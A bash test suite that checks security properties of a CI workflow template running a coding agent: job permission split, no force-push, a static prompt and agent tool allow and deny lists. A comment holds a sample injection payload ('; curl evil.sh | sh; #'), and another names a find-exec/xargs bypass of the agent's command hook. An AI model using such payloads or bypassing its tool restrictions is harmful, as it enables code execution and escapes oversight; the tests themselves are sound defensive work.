#!/usr/bin/env bash
# The post-merge workflow's security invariants.
#
# This file is rendered into other people's repositories and runs with a write
# token. Every property below is one someone could plausibly remove while
# "simplifying" the workflow, and each removal is silently exploitable rather
# than loudly broken.

_dossier_test_begin "workflow-template"

WF="plugins/dossier/templates/ci/dossier-docs-refresh.yml"
PLUGIN="plugins/dossier"
assert_file_exists "$WF" "workflow template exists"

BODY=$(cat "$WF" 2>/dev/null)

# --- Parses as YAML ----------------------------------------------------------
if command -v python3 >/dev/null 2>&1 && python3 -c 'import yaml' 2>/dev/null; then
  # Placeholders are substituted at render time and are not valid YAML values in
  # every position, so substitute plausible values before parsing.
  TMP=$(mktemp 2>/dev/null) || TMP="/tmp/dossier-wf.$$"
  # The path-filter placeholder sits at column 0 and setup renders an indented
  # block sequence into it; reproduce that indentation or the parse is testing
  # the wrong document.
  sed -e 's/^{{DOSSIER_PATH_FILTERS}}/      - "src\/**"/' \
      -e "s/{{DOSSIER_SCHEDULE_CRON}}/0 6 * * 1/" \
      -e 's/{{DOSSIER_TRIGGER_EVENT}}/pull_request/' \
      -e 's/{{DOSSIER_ROLLING_BRANCH}}/docs\/dossier/' \
      -e 's/{{DOSSIER_DOCS_DIR}}/docs\/dossier/' \
      -e 's/{{DOSSIER_MARKETPLACE_URL}}/https:\/\/example.invalid\/m.git/' \
      -e 's/{{DOSSIER_MARKETPLACE_REPO}}/synaptiai\/synapti-marketplace/' \
      -e 's/{{DOSSIER_REF}}/v1.0.0/' \
      -e 's/{{DOSSIER_PLUGIN_VERSION}}/1.0.0/' \
      -e 's/{{DOSSIER_LABEL_GENERATED}}/dossier:generated/' \
      -e 's/{{DOSSIER_LABEL_SKIP}}/docs:skip/' \
      -e 's/{{DOSSIER_LABEL_OVERSIZED}}/dossier:oversized/' \
      "$WF" > "$TMP"
  if python3 -c "import yaml,sys; yaml.safe_load(open(sys.argv[1]))" "$TMP" 2>/dev/null; then
    _dossier_assert_pass "workflow parses as YAML after placeholder substitution"
  else
    _dossier_assert_fail "workflow does not parse as YAML: $(python3 -c "import yaml,sys; yaml.safe_load(open(sys.argv[1]))" "$TMP" 2>&1 | tail -1)"
  fi
  rm -f "$TMP" 2>/dev/null
else
  _dossier_assert_pass "yaml module unavailable — parse check skipped, structural checks still run"
fi

# --- Privilege split ---------------------------------------------------------
# Three jobs, and the agent job must never hold a write token.
for job in "  policy:" "  scan:" "  refresh:" "  publish:"; do
  assert_contains "$job" "$BODY" "job ${job# } declared"
done

assert_match '^permissions: \{\}' "$BODY" "top-level permissions is empty — per-job grants only"

# --- Rotation check (issue #138): telemetry-only, runs unconditionally ------
# The policy job must invoke dossier-rotation-check.sh, and that specific step
# must carry no `if:` gate — it has to run on every trigger, including a
# declined run, so the metric is never conditional on should_run.
POLICY_BLOCK=$(awk '/^  policy:/{f=1} /^  scan:/{f=0} f' "$WF")
assert_contains "dossier-rotation-check.sh" "$POLICY_BLOCK" "the policy job invokes dossier-rotation-check.sh"
assert_contains "name: Check whether the documentation branch would rotate" "$POLICY_BLOCK" "the policy job names the rotation-check step"

# Extract only the rotation-check step's own block: from its own `- name:`
# line up to (but not including) the next `- name:` line, so a gate that
# exists elsewhere in the policy job (e.g. on "Build the evidence bundle")
# cannot produce a false pass.
ROTATION_STEP_BLOCK=$(awk '
  /- name: Check whether the documentation branch would rotate/ { f=1; print; next }
  f && /^      - name:/ { exit }
  f { print }
' "$WF")
assert_not_contains "if: steps.decide.outputs.should_run" "$ROTATION_STEP_BLOCK" "the rotation-check step runs unconditionally, even on a declined run"

# A failure in this purely-observational step must never cascade into
# skipping "Build the evidence bundle" (gated on should_run == 'true', which
# GitHub Actions implicitly ANDs with success()) -- matching the precedent
# already set by "Download the scan bundle" below.
assert_contains "continue-on-error: true" "$ROTATION_STEP_BLOCK" "the rotation-check step cannot block the evidence-bundle build"

# BASE_REF/GH_TOKEN come from github.event context expressions, not template
# placeholders, so the step introduces no new {{PLACEHOLDER}} and needs no
# addition to the sed substitution table above. Anchored on the render-time
# `{{DOSSIER_` prefix, not a bare `{{`, since `${{ github.event... }}` is a
# legitimate GitHub Actions expression that also contains `{{`.
assert_not_contains "{{DOSSIER_" "$ROTATION_STEP_BLOCK" "the rotation-check step introduces no new template placeholder"

# --- Rotation telemetry surfaced as job outputs (issue #148) -----------------
# Without an id: and --github-output, the rotation step's fields land only in
# stdout/the job summary -- human-readable per run, but not queryable across
# runs, undercutting the whole point of an observation period. Both the step
# itself and the policy job's outputs: map need updating.
assert_contains "id: rotation" "$ROTATION_STEP_BLOCK" "the rotation-check step has its own step id"
assert_contains "--github-output \"\$GITHUB_OUTPUT\"" "$ROTATION_STEP_BLOCK" "the rotation-check step passes --github-output so its fields land in GITHUB_OUTPUT, not just stdout/summary"

# The script's own emitted keys (would_rotate/reason/age_days/age_source/
# accumulated_files/accumulated_lines/rotation_policy) collide with two keys
# the decide step ALREADY exposes on this same job (reason, docs_branch) --
# confirmed by reading both the script's emit() calls and this job's existing
# outputs: map. Every rotation-sourced output is prefixed rotation_ to avoid
# that collision, and the redundant docs_branch (both steps resolve the
# identical dossier.ci.rollingBranch config in the same job run) is dropped
# rather than re-exposed under a new name.
# Six fields keep their script-emitted name, prefixed on the output-map side
# only. rotation_policy is the odd one out: the script itself already emits a
# field literally named rotation_policy (see dossier-rotation-check.sh's own
# finish()), so no further prefixing is applied there -- rotation_rotation_policy
# would be wrong.
for KEY in would_rotate reason age_days age_source accumulated_files accumulated_lines; do
  assert_contains "rotation_${KEY}: \${{ steps.rotation.outputs.${KEY} }}" "$BODY" "policy job exposes rotation_${KEY} sourced from steps.rotation.outputs.${KEY}"
done
assert_contains "rotation_policy: \${{ steps.rotation.outputs.rotation_policy }}" "$BODY" "policy job exposes rotation_policy sourced from steps.rotation.outputs.rotation_policy"

# No collision: the pre-existing decide-step-sourced reason/docs_branch
# outputs must be completely unchanged -- this is a regression test for the
# exact bug in this issue's own suggested fix (naming the new outputs
# unmodified would have silently collided with these).
assert_contains "reason: \${{ steps.decide.outputs.reason }}" "$BODY" "the pre-existing decide-step reason output is untouched"
assert_contains "docs_branch: \${{ steps.decide.outputs.docs_branch }}" "$BODY" "the pre-existing decide-step docs_branch output is untouched"
# Six-space indentation anchors this as its own outputs: map key rather than
# matching as a substring of the legitimate "rotation_reason: ..." line above
# (which also contains the literal text "reason: \${{ steps.rotation.outputs.reason }}").
assert_not_contains "
      reason: \${{ steps.rotation.outputs.reason }}" "$BODY" "no unprefixed rotation-sourced reason output was added (would collide with decide's own reason)"
assert_not_contains "docs_branch: \${{ steps.rotation.outputs" "$BODY" "no rotation-sourced docs_branch output was added at all (redundant with decide's own docs_branch, dropped per design)"

# --- existing_pr_lookup_failed guards the publish job's recreate path -------
# A gh pr list failure (or gh unavailable) leaves existing_pr empty, which is
# indistinguishable from a genuine "no PR open" result unless this signal is
# threaded through. Left unguarded, the publish job's branch-preparation step
# would treat that emptiness as license to delete and recreate the
# documentation branch whenever it already exists with no foreign commits --
# exactly the steady state whenever a real docs PR IS open and the lookup
# just failed to report it (review finding on issues #143/#146/#148's own
# bundle, not a scenario from either issue's original body).
assert_contains "existing_pr_lookup_failed: \${{ steps.decide.outputs.existing_pr_lookup_failed }}" "$BODY" "policy job exposes existing_pr_lookup_failed sourced from the decide step"
assert_contains "EXISTING_PR_LOOKUP_FAILED: \${{ needs.policy.outputs.existing_pr_lookup_failed }}" "$BODY" "the branch-preparation step reads existing_pr_lookup_failed from the policy job"
# Checked against the safe value ("!= false"), never the unsafe one
# ("= true") -- an absent/unexpected signal (e.g. a rendered workflow paired
# with an older dossier-policy.sh that predates this field) must also refuse,
# not silently fall through to the destructive recreate path
# (/flow:review PR#153, security-skeptic SEC-1).
assert_contains 'elif [ "$EXISTING_PR_LOOKUP_FAILED" != "false" ]; then' "$BODY" "the branch-preparation step's recreate path fails closed on anything but an explicit false"
assert_not_contains 'elif [ "$EXISTING_PR_LOOKUP_FAILED" = "true" ]; then' "$BODY" "the fail-open form (checking for the unsafe value) is not present anywhere in the workflow"
assert_contains "Refusing to delete and recreate a branch that might have review history attached" "$BODY" "a failed pull-request lookup refuses the destructive recreate path rather than guessing"

# Extract only the branch-preparation step's own block, matching the
# ROTATION_STEP_BLOCK technique above: from its own `- name:` line up to (but
# not including) the next `- name:` line, so text elsewhere in the workflow
# (e.g. a comment mentioning the same phrases) cannot produce a false pass.
BRANCH_PREP_BLOCK=$(awk '
  /- name: Prepare the documentation branch/ { f=1; print; next }
  f && /^      - name:/ { exit }
  f { print }
' "$WF")

# git rev-list's own exit status must be checked before its output is
# consumed, and the failure path must refuse rather than silently treat the
# failure as "no foreign commits" (/flow:review PR#153, error-handler
# skeptic+verifier auto-consensus ERR-1). A plain assert_contains cannot
# detect the check being present but unreachable (e.g. moved after the
# consuming loop), so line order within the extracted block is verified
# explicitly, matching the CLEANUP_LINE_NUM/UPLOAD_LINE_NUM technique above.
assert_contains 'REV_LIST_RC=$?' "$BRANCH_PREP_BLOCK" "the branch-preparation step captures git rev-list's own exit status"
assert_contains 'if [ "$REV_LIST_RC" -ne 0 ]; then' "$BRANCH_PREP_BLOCK" "the branch-preparation step checks the captured exit status"
assert_contains "could not verify the documentation branch history" "$BRANCH_PREP_BLOCK" "a failed rev-list refuses with its own job-summary error block"

REV_LIST_CAPTURE_LINE=$(printf '%s\n' "$BRANCH_PREP_BLOCK" | grep -n 'REV_LIST_RC=\$?' | head -1 | cut -d: -f1)
REV_LIST_CHECK_LINE=$(printf '%s\n' "$BRANCH_PREP_BLOCK" | grep -n 'if \[ "\$REV_LIST_RC" -ne 0 \]; then' | head -1 | cut -d: -f1)
REV_LIST_CONSUME_LINE=$(printf '%s\n' "$BRANCH_PREP_BLOCK" | grep -n 'for C in \$REV_LIST_OUT' | head -1 | cut -d: -f1)
if [ -n "$REV_LIST_CAPTURE_LINE" ] && [ -n "$REV_LIST_CHECK_LINE" ] && [ -n "$REV_LIST_CONSUME_LINE" ] \
  && [ "$REV_LIST_CAPTURE_LINE" -lt "$REV_LIST_CHECK_LINE" ] && [ "$REV_LIST_CHECK_LINE" -lt "$REV_LIST_CONSUME_LINE" ]; then
  _dossier_assert_pass "git rev-list's exit status is checked before its output is consumed by the FOREIGN-commit loop"
else
  _dossier_assert_fail "git rev-list's exit status is not verifiably checked before its output is consumed"
fi

# The fail-closed existing_pr_lookup_failed elif must actually be reachable:
# it must appear as its own arm of the SAME if/elif chain, strictly before
# the chain's final `else` / `MODE=recreate` fallback -- otherwise a
# misordering could leave the guard present in the file (satisfying a plain
# assert_contains) but dead code that this destructive path never reaches.
LOOKUP_FAILED_LINE=$(printf '%s\n' "$BRANCH_PREP_BLOCK" | grep -n 'elif \[ "\$EXISTING_PR_LOOKUP_FAILED" != "false" \]; then' | head -1 | cut -d: -f1)
FOREIGN_ELIF_LINE=$(printf '%s\n' "$BRANCH_PREP_BLOCK" | grep -n 'elif \[ -n "\$FOREIGN" \]; then' | head -1 | cut -d: -f1)
RECREATE_LINE=$(printf '%s\n' "$BRANCH_PREP_BLOCK" | grep -n 'MODE=recreate' | head -1 | cut -d: -f1)
if [ -n "$FOREIGN_ELIF_LINE" ] && [ -n "$LOOKUP_FAILED_LINE" ] && [ -n "$RECREATE_LINE" ] \
  && [ "$FOREIGN_ELIF_LINE" -lt "$LOOKUP_FAILED_LINE" ] && [ "$LOOKUP_FAILED_LINE" -lt "$RECREATE_LINE" ]; then
  _dossier_assert_pass "existing_pr_lookup_failed is checked as a reachable arm of the if/elif chain, strictly before the recreate fallback"
else
  _dossier_assert_fail "existing_pr_lookup_failed guard is not verifiably ordered before the recreate fallback"
fi

# --- AC2: the policy job never closes a PR, deletes a branch, or creates a --
# replacement branch, under any circumstance ---------------------------------
# Scoped to the policy job block ONLY (reused from above) — the publish job
# legitimately contains "git push origin --delete" as its own
# destructive-branch-guard code (a different job, a different privilege
# level, pre-existing correct behaviour that is not touched here).
assert_not_contains "git push origin --delete" "$POLICY_BLOCK" "policy job never deletes the docs branch"
assert_not_contains "git branch -D" "$POLICY_BLOCK" "policy job never force-deletes a branch"
assert_not_contains "gh pr close" "$POLICY_BLOCK" "policy job never closes a pull request"
assert_not_contains "gh pr merge" "$POLICY_BLOCK" "policy job never merges a pull request"
assert_contains "contents: read" "$POLICY_BLOCK" "policy job still declares contents: read"
assert_contains "pull-requests: read" "$POLICY_BLOCK" "policy job still declares pull-requests: read"
assert_not_contains "contents: write" "$POLICY_BLOCK" "policy job gains NO write permission from the new step"
assert_not_contains "pull-requests: write" "$POLICY_BLOCK" "policy job gains NO pull-requests write permission from the new step"

# dossier-rotation-check.sh is independently callable outside CI, so it needs
# its own check, not just the workflow YAML.
ROTATION_SCRIPT_BODY=$(cat "$PLUGIN/bin/dossier-rotation-check.sh" 2>/dev/null)
for destructive in "git push" "gh pr close" "gh pr merge" "git branch -D" "git branch -d"; do
  assert_not_contains "$destructive" "$ROTATION_SCRIPT_BODY" "dossier-rotation-check.sh itself never runs '$destructive'"
done

# The scan job (issue #137): isolated osv-scanner/pyscn execution. Same
# privilege posture as policy — read-only, no write token, no agent.
SCAN_BLOCK=$(awk '/^  scan:/{f=1} /^  refresh:/{f=0} f' "$WF")
assert_contains "contents: read" "$SCAN_BLOCK" "scan job has contents: read"
assert_not_contains "contents: write" "$SCAN_BLOCK" "scan job has NO write permission"
assert_not_contains "pull-requests: write" "$SCAN_BLOCK" "scan job cannot open PRs"
assert_not_contains "anthropics/claude-code-action" "$SCAN_BLOCK" "scan job runs NO agent"
assert_not_contains "ANTHROPIC_API_KEY" "$SCAN_BLOCK" "scan job never sees the Anthropic key"
assert_not_contains "CLAUDE_CODE_OAUTH_TOKEN" "$SCAN_BLOCK" "scan job never sees the OAuth token"
assert_contains "persist-credentials: false" "$SCAN_BLOCK" "scan job does not persist git credentials"
assert_contains "timeout-minutes:" "$SCAN_BLOCK" "scan job declares a timeout"
assert_contains "dossier-scan-security.sh" "$SCAN_BLOCK" "scan job invokes the security scanner wrapper"
assert_contains "dossier-scan-quality.sh" "$SCAN_BLOCK" "scan job invokes the quality scanner wrapper"
assert_contains "upload-artifact" "$SCAN_BLOCK" "scan job uploads its results as an artifact"
assert_contains "name: dossier-scan" "$SCAN_BLOCK" "scan job's artifact is named dossier-scan"
# pyscn's raw output carries no untrusted-content note of its own (unlike
# the wrapper's own envelope, which does, and unlike pyscn's envelope, which
# already embeds its findings inline) -- must not ship in the uploaded
# artifact unannotated. osv-scanner's raw output is the opposite case: its
# wrapper's envelope embeds no findings of its own, so the raw file is the
# only artifact in the bundle a downstream Read can get citable
# vulnerability content from -- it must survive to the uploaded artifact,
# never be deleted alongside pyscn's.
#
# Anchored on the actual `run: rm -f ...` step, not any line that merely
# mentions a filename -- the surrounding comments name both files by design
# (explaining why one is kept and one isn't), so a bare substring match
# would pass even if the real step were deleted, relocated after upload, or
# widened to remove osv-scan-raw.json too.
CLEANUP_RUN_LINE=$(printf '%s\n' "$SCAN_BLOCK" | grep -n '^ *run: rm -f' | head -1)
CLEANUP_LINE_NUM=$(printf '%s' "$CLEANUP_RUN_LINE" | cut -d: -f1)
CLEANUP_LINE_CONTENT=$(printf '%s' "$CLEANUP_RUN_LINE" | cut -d: -f2-)
assert_contains "pyscn-scan-raw.json" "$CLEANUP_LINE_CONTENT" "the actual rm -f step removes pyscn's un-annotated raw output before upload"
assert_not_contains "osv-scan-raw.json" "$CLEANUP_LINE_CONTENT" "the actual rm -f step does NOT remove osv-scanner's raw output -- it is the only bundle artifact carrying citable vulnerability content"
UPLOAD_LINE_NUM=$(printf '%s\n' "$SCAN_BLOCK" | grep -n 'name: Upload the scan bundle' | head -1 | cut -d: -f1)
if [ -n "$UPLOAD_LINE_NUM" ] && [ -n "$CLEANUP_LINE_NUM" ] && [ "$CLEANUP_LINE_NUM" -lt "$UPLOAD_LINE_NUM" ]; then
  _dossier_assert_pass "raw-output cleanup runs before the artifact upload, not after"
else
  _dossier_assert_fail "raw-output cleanup does not run before the artifact upload"
fi
assert_not_contains "@latest" "$SCAN_BLOCK" "scan job's tool install does not float on @latest"
if printf '%s' "$SCAN_BLOCK" | grep -qE 'OSV_VERSION=v[0-9]+\.[0-9]+\.[0-9]+'; then
  _dossier_assert_pass "scan job pins an explicit osv-scanner release version"
else
  _dossier_assert_fail "scan job does not pin an explicit osv-scanner release version"
fi
assert_contains "sha256sum -c" "$SCAN_BLOCK" "scan job verifies the downloaded osv-scanner binary by checksum"
if printf '%s' "$SCAN_BLOCK" | grep -qE "pyscn==[0-9]+\.[0-9]+\.[0-9]+"; then
  _dossier_assert_pass "scan job pins an explicit pyscn version"
else
  _dossier_assert_fail "scan job does not pin an explicit pyscn version"
fi

# Step-level fault isolation (error-handler-inspector P2, confirmed by 3
# independent reviewers): runSecurityScan/runCodeQualityScan are documented
# as independent capabilities, but without always() a hard failure of one
# scan step skips every step after it by GitHub Actions' default -- silently
# losing the OTHER scan's coverage and the artifact upload too. Anchored on
# "name: X" immediately followed by "if: always()" so a step that HAS an
# always() elsewhere in the block (e.g. on a different step) can't produce a
# false pass.
assert_contains "name: Run the security scan
        if: always()" "$SCAN_BLOCK" "the security-scan step runs even if an earlier step in the job failed"
assert_contains "name: Run the code-quality scan
        if: always()" "$SCAN_BLOCK" "the quality-scan step runs even if the security-scan step failed -- the two capabilities stay independent at the CI-step level, not just by config flag"
assert_contains "name: Remove raw tool output before upload
        if: always()" "$SCAN_BLOCK" "the raw-output cleanup step runs even if a scan step failed, so a partial success still gets cleaned before upload"
assert_contains "name: Upload the scan bundle
        if: always()" "$SCAN_BLOCK" "the upload step runs even if a scan step failed -- whichever scan DID produce output still ships instead of being discarded as collateral damage"

# The refresh job (the one running the agent) must have contents: read.
REFRESH_BLOCK=$(awk '/^  refresh:/{f=1} /^  publish:/{f=0} f' "$WF")
assert_contains "contents: read" "$REFRESH_BLOCK" "refresh job has contents: read"
assert_not_contains "contents: write" "$REFRESH_BLOCK" "refresh job has NO write permission"
assert_not_contains "pull-requests: write" "$REFRESH_BLOCK" "refresh job cannot open PRs"
assert_contains "persist-credentials: false" "$REFRESH_BLOCK" "refresh job does not persist git credentials"

# refresh now depends on scan too (for the artifact download), and must
# proceed even if scan itself fails outright (not just reports a non-ok
# status) — GitHub Actions ANDs an implicit success() onto every needs:
# entry, so needs: [policy, scan] alone would silently skip refresh on a
# scan-job failure unrelated to the wrapper scripts (e.g. a network blip
# during the tool install), directly contradicting the "must never block
# documenting the range" guarantee (/flow:review PR#137, code-reviewer P2).
# always() overrides that implicit gate; needs.policy.outputs.should_run
# still correctly gates on policy specifically, since a failed policy job
# never sets that output.
assert_contains "needs: [policy, scan]" "$BODY" "refresh depends on both policy and scan"
assert_contains "always() && needs.policy.outputs.should_run" "$BODY" "refresh's if: is not implicitly success-gated on scan alone"
assert_contains "dossier-scan" "$REFRESH_BLOCK" "refresh downloads the scan bundle artifact"

# The download step must not hard-fail refresh when scan never uploaded the
# artifact (the always() change above makes that reachable: refresh can now
# run even when scan failed to produce anything).
SCAN_DOWNLOAD_BLOCK=$(awk '/Download the scan bundle/{f=1} f{print} f && /path: \.dossier\/scan\//{exit}' "$WF")
assert_contains "continue-on-error: true" "$SCAN_DOWNLOAD_BLOCK" "the scan-bundle download step tolerates a missing artifact"

# The publish job holds the write token and must run no agent.
PUBLISH_BLOCK=$(awk '/^  publish:/{f=1} f' "$WF")
assert_contains "contents: write" "$PUBLISH_BLOCK" "publish job has contents: write"
assert_not_contains "anthropics/claude-code-action" "$PUBLISH_BLOCK" "publish job runs NO agent"
assert_not_contains "ANTHROPIC_API_KEY" "$PUBLISH_BLOCK" "publish job never sees the Anthropic key"

# The agent runs exactly once, in the refresh job.
ACTION_COUNT=$(grep -c 'uses: anthropics/claude-code-action' "$WF" 2>/dev/null || echo 0)
assert_equal "1" "$ACTION_COUNT" "the agent action appears exactly once"
assert_contains "anthropics/claude-code-action" "$REFRESH_BLOCK" "the agent runs in the refresh job"

# --- Loop prevention ---------------------------------------------------------
# Four independent guards, evaluated by GitHub before a runner is allocated.
assert_contains "merged == true" "$BODY" "guard: only merged pull requests"
assert_contains "startsWith(github.event.pull_request.head.ref" "$BODY" "guard: head-ref prefix"
assert_contains "labels.*.name" "$BODY" "guard: label checks"
assert_contains "github-actions[bot]" "$BODY" "guard: bot actor"

# --- No force-push anywhere --------------------------------------------------
# Fetch refspecs legitimately use a leading +; pushes must not.
if grep -E '^\s*git push' "$WF" | grep -qE '(--force|--force-with-lease|[[:space:]]\+refs)'; then
  _dossier_assert_fail "workflow contains a forced push"
else
  _dossier_assert_pass "no forced push anywhere"
fi

# Merge-forward, never rebase — a rebase would require the force-push above.
if grep -qE '^\s*git rebase' "$WF"; then
  _dossier_assert_fail "workflow rebases the docs branch"
else
  _dossier_assert_pass "no rebase (merge-forward only)"
fi

# --- Shell injection ---------------------------------------------------------
# Untrusted values must reach shell as env vars, never as ${{ }} interpolation
# inside a run: body. A PR titled '; curl evil.sh | sh; #' would otherwise run.
VIOLATIONS=$(awk '
  /run: *\|?/ { inrun=1; indent=match($0, /[^ ]/); next }
  inrun && NF && match($0, /[^ ]/) <= indent { inrun=0 }
  inrun && /\$\{\{ *(github\.event|inputs\.|github\.head_ref)/ { print NR": "$0 }
' "$WF")
if [ -z "$VIOLATIONS" ]; then
  _dossier_assert_pass "no untrusted \${{ }} interpolation inside any run: block"
else
  _dossier_assert_fail "untrusted interpolation inside run: — $(printf '%s' "$VIOLATIONS" | head -2)"
fi

# --- Concurrency and history -------------------------------------------------
assert_contains "concurrency:" "$BODY" "workflow serializes runs"
assert_contains "cancel-in-progress: false" "$BODY" "runs are not cancelled mid-agent"
assert_contains "fetch-depth: 0" "$BODY" "full history — a shallow clone silently yields the wrong range"

# github.sha is the test-merge commit on pull_request events, not a commit on
# the base branch. Using it produces a range that looks right and is not.
assert_contains "merge_commit_sha" "$BODY" "uses merge_commit_sha, not github.sha"

# --- Credential preflight fails loudly ---------------------------------------
assert_contains "::error" "$BODY" "emits an error annotation on misconfiguration"
assert_contains "gh secret set" "$BODY" "remediation names the exact command"
assert_contains "not permitted to create" "$BODY" "handles the Actions-cannot-create-PRs failure"

# --- Plugin install ----------------------------------------------------------
assert_contains "plugin_marketplaces" "$BODY" "installs the marketplace"
assert_contains "dossier@synapti-marketplace" "$BODY" "installs the dossier plugin"
assert_contains "/dossier:refresh" "$BODY" "invokes the refresh command"

# --- Tool restriction --------------------------------------------------------
assert_contains "allowedTools" "$BODY" "restricts the agent's tools"
assert_contains "disallowedTools" "$BODY" "explicitly denies dangerous tools"

# refresh.md dispatches a collector plus per-document drafters and loads four
# skills. Omit Agent/Skill from the allowlist and every one of those calls is
# unreachable in a headless run — the fan-out silently degrades to flat inline
# drafting with no signal that it happened.
# Anchor on the flag itself: a bare 'allowedTools' grep matches the substring
# inside '--disallowedTools' in the design-notes header first.
ALLOWED=$(grep -m1 -- '--allowedTools "' "$WF")
for needed in "Agent" "Skill"; do
  assert_contains "$needed" "$ALLOWED" "CI allowlist includes $needed (refresh.md dispatches it)"
done
for denied in "WebFetch" "git push"; do
  DIS=$(grep -A3 'disallowedTools' "$WF" | head -8)
  assert_contains "$denied" "$DIS" "denies $denied"
done

# The refresh job's agent is the only place enforce-allowed-actions.sh's
# scanner deny-blocks could matter in CI (the scan job is a plain shell step
# with no agent at all) — so the refresh job's own Bash allowlist is the real
# backstop against the hook's known find-exec/xargs-I{} bypass (issue #143).
# Granular Bash(cmd:*) entries are the boundary; find/xargs are absent from
# the list entirely, not merely unlisted alongside others.
for excluded in "Bash(find" "Bash(xargs" "Bash(osv-scanner" "Bash(pyscn"; do
  assert_not_contains "$excluded" "$ALLOWED" "CI allowlist excludes $excluded — the find-exec/xargs hook bypass (#143) cannot reach a tool the refresh job was never granted"
done

# --- Prompt is static --------------------------------------------------------
# The prompt carries a path, never attacker-controlled content.
PROMPT_LINE=$(grep -E '^\s*prompt:' "$WF" | head -1)
if printf '%s' "$PROMPT_LINE" | grep -q 'github.event'; then
  _dossier_assert_fail "prompt interpolates event data — it must carry a path only"
else
  _dossier_assert_pass "prompt is static (carries a path, not content)"
fi

# --- Managed-file stamp placeholder ------------------------------------------
assert_contains "{{DOSSIER_ROLLING_BRANCH}}" "$BODY" "branch prefix is render-time substituted"
assert_contains "{{DOSSIER_DOCS_DIR}}" "$BODY" "docs dir is render-time substituted"

# --- The cursor must not advance on a failed run -----------------------------
# Every substantive publish step is gated on has_changes, so a genuine no-op
# skips them and the job succeeds — the no-op advance still happens. A FAILED
# run is different: leaving the cursor where it was is what makes the next run's
# range widen instead of skipping the changes that failed to publish. `always()`
# collapses those two cases into one and produces a silent documentation gap.
CURSOR_BLOCK=$(awk '/- name: Advance the documentation cursor/{f=1} f{print} f&&/run:/{exit}' "$WF")
if printf '%s' "$CURSOR_BLOCK" | grep -q 'if: *always()'; then
  _dossier_assert_fail "the cursor advances with always(), so a failed publish silently skips its range"
else
  _dossier_assert_pass "the cursor does not advance with always()"
fi
if printf '%s' "$CURSOR_BLOCK" | grep -q "if: *success()"; then
  _dossier_assert_pass "the cursor advance is gated on success()"
else
  _dossier_assert_fail "the cursor advance is not gated on success()"
fi

# --- Stale-sweep documents reach the blast radius ----------------------------
# The policy job's decision must surface as a job output, and the evidence-
# bundle step must thread it into dossier-blast-radius.sh, or a schedule-
# triggered stale-sweep run computes should_run=true but the affected
# document never actually gets a verification pass.
assert_contains "stale_docs: \${{ steps.decide.outputs.stale_docs }}" "$BODY" "policy job exposes stale_docs as a job output"
assert_contains "STALE_DOCS: \${{ steps.decide.outputs.stale_docs }}" "$BODY" "the evidence-bundle step reads stale_docs from the decide step"
assert_contains "STALE_DOCS_ARGS" "$BODY" "dossier-blast-radius.sh is invoked with the stale-docs list when present"

_dossier_test_summary
